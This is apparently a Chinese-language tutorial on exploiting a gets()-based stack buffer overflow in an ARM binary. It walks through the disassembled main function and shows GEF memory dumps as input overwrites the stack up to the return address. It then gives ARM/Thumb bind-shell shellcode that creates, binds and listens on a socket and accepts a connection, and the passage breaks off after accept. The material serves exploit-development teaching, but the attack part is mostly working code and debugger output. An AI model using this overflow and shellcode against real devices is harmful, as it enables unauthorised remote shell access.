       10318:    e28fc600     add    ip, pc, #0, 12
       1031c:    e28cca10     add    ip, ip, #16, 20    ; 0x10000
       10320:    e5bcf350     ldr    pc, [ip, #848]!    ; 0x350
    Disassembly of section .text:
    00010324 :
       10324:    e3a0b000     mov    fp, #0
       10328:    e3a0e000     mov    lr, #0
       1032c:    e49d1004     pop    {r1}        ; (ldr r1, [sp], #4)
       10330:    e1a0200d     mov    r2, sp
       10334:    e52d2004     push    {r2}        ; (str r2, [sp, #-4]!)
       10338:    e52d0004     push    {r0}        ; (str r0, [sp, #-4]!)
       1033c:    e59fc010     ldr    ip, [pc, #16]    ; 10354 
       10340:    e52dc004     push    {ip}        ; (str ip, [sp, #-4]!)
       10344:    e59f000c     ldr    r0, [pc, #12]    ; 10358 
       10348:    e59f300c     ldr    r3, [pc, #12]    ; 1035c 
       1034c:    ebffffeb     bl    10300         ;这个库函数获取了main函数的地址，开启了main函数的执行流程
       10350:    ebfffff0     bl    10318 
       10354:    0001050c     .word    0x0001050c
       10358:    0001044c     .word    0x0001044c               ;很明显这是main函数的地址
       1035c:    000104a8     .word    0x000104a8
    ...............
    0001044c :
       1044c:    e92d4800     push    {fp, lr}
       10450:    e28db004     add    fp, sp, #4
       10454:    e24dd050     sub    sp, sp, #80    ; 0x50
       10458:    e50b0050     str    r0, [fp, #-80]    ; 0xffffffb0
       1045c:    e50b1054     str    r1, [fp, #-84]    ; 0xffffffac
       10460:    e3a03000     mov    r3, #0
       10464:    e50b3008     str    r3, [fp, #-8]
       10468:    e24b3048     sub    r3, fp, #72    ; 0x48
       1046c:    e1a00003     mov    r0, r3
       10470:    ebffff9c     bl    102e8 
       10474:    e51b3008     ldr    r3, [fp, #-8]
       10478:    e3530000     cmp    r3, #0
       1047c:    0a000002     beq    1048c 
       10480:    e59f0018     ldr    r0, [pc, #24]    ; 104a0 
       10484:    ebffff9a     bl    102f4 
       10488:    ea000001     b    10494 
       1048c:    e59f0010     ldr    r0, [pc, #16]    ; 104a4 
       10490:    ebffff97     bl    102f4 
       10494:    e1a00003     mov    r0, r3
       10498:    e24bd004     sub    sp, fp, #4
       1049c:    e8bd8800     pop    {fp, pc}
       104a0:    0001051c     .word    0x0001051c
       104a4:    00010548     .word    0x00010548
    ..............
下面进行逐步分析：
  1. 保存了`当前栈帧的返回地址`和`上一个栈帧`的帧地址。  
将`帧指针r11`指向当前栈帧顶部的返回地址  
压栈操作，压入大小为80字节的空间，为变量、参数准备的临时存放空间。  
将`r0, r1`进行入栈操作，并且放在`栈顶`的位置，这是`上一个栈帧`的变量，我们需要保护起来。
        0x0001044c :    push    {r11, lr}
    0x00010450 :    add    r11, sp, #4
    0x00010454 :    sub    sp, sp, #80    ; 0x50
    0x10458         str    r0,  [r11,  #-80]    ; 0x50
  2. 给`r3`寄存器赋0值，然后将r3内的0存放到`r11-8`内存地址指向的空间，这个地址是临着`上一个栈帧的帧指针r11-4`（r11是当前栈帧的帧指针，指向当前栈帧顶部，顶部存放着返回地址） 
           0x1045c         str    r1,  [r11,  #-84]    ; 0x54
       0x10460         mov    r3,  #0
       0x10464         str    r3,  [r11,  #-8]
  3. 将r11-0x48（`0xbefff0e4`）的地址通过r3赋值给r0，然后作为参数传进`gets`函数中执行，这个函数会将用户输入的内容，存放到0xbefff0e4这个地址空间中 
        ->   0x10468         sub    r3,  r11,  #72    ; 0x48，上一个指针的两个变量存储用了8字节空间，刚好从r11-72的地址开始给当前栈帧的
                                                     ;参数使用
       0x1046c         mov    r0,  r3
       0x10470         bl     0x102e8 
  4. 开始输入字符串，测试溢出  
下面显示地址空间存储的值，`0xbefff0e4`地址是存放用户输入字符串开始的位置，下面我们尝试输入不同的字符来看下面这些地址存放的值的变化
        gef> x/19x 0xbefff0e4
    0xbefff0e4:    0xb6ffbfc4    0x00000003    0xb6e77be8    0x00000000
    0xbefff0f4:    0xb6e779f8    0xbefff130    0xb6fd618c    0x00000000
    0xbefff104:    0x00000000    0x00010414    0x000104f8    0xb6fb2ba0
    0xbefff114:    0x000104a8    0x00000000    0x00010324    0x00000000
    0xbefff124:    0x00000000    0x00000000    0xb6e8c294
尝试输入4个1后的结果输出，很明显`0xb6ffbfc4
0x00000003`中前四个字节被`0x31313131`（1的16进制）覆盖了，`0x00000003`这个值内的`03`被gets函数默认用`0x00`覆盖用来标志字符串的结尾
        gef> x/19x 0xbefff0e4
    0xbefff0e4:    0x31313131    0x00000000    0xb6e77be8    0x00000000
    0xbefff0f4:    0xb6e779f8    0xbefff130    0xb6fd618c    0x00000000
    0xbefff104:    0x00000000    0x00010414    0x000104f8    0xb6fb2ba0
    0xbefff114:    0x000104a8    0x00000000    0x00010324    0x00000000
    0xbefff124:    0x00000000    0x00000000    0xb6e8c294
下面我们直接输入足够的长度，一直到返回地址处，根据上面的`sub r3, r11,
#72`语句，将r11-72出作为存放用户输入的初始地址，可以知道，输入的长度至少72，这样`0xb6e8c294`最低位`94`会被`00`覆盖，下面我们进行输入72个1的覆盖，很明显我们如我们所料。（可以多输入几个字符完全覆盖，因为只覆盖最低位两个字符，可能依然会存在该地址，而导致不能实现程序的崩溃）
        0xbefff0e4:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0f4:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff104:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff114:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff124:    0x31313131    0x31313131    0xb6e8c200
  5. 最后一步—-`shellcode`。构造一个shellcode来利用这个溢出漏洞，最一个完美的结尾。具体shellcode编写可以参考我的另一篇文章：  
shellcode代码—-BindShell
    .section .text
    .global _start
    _start:
        .code 32
        //arm set switch thumb set
        add r3, pc, #1
        bx r3
        .code 16
        //create a socket 
        mov r0, #2
        mov r1, #1
        sub r2, r2, r2
        mov r7, #200
        add r7, #81    
        svc #1    
        //bind local address
        mov r4, r0
        adr r1, local_addr
        strb r2, [r1, #1]
        strh r2, [r1, #4]
        nop
        strb r2, [r1, #6]
        strb r2, [r1, #7]
        mov r2, #16
        add r7, #1
        svc #1
        //start listen,wait for connection
        mov r0, r4
        mov r1, #2
        add r7, #2
        svc #1
        //accept first connection
        mov r0, r4
        eor r1, r1, r1
        eor r2, r2, r2
        add r7, #1
        svc #1
        mov r4, r0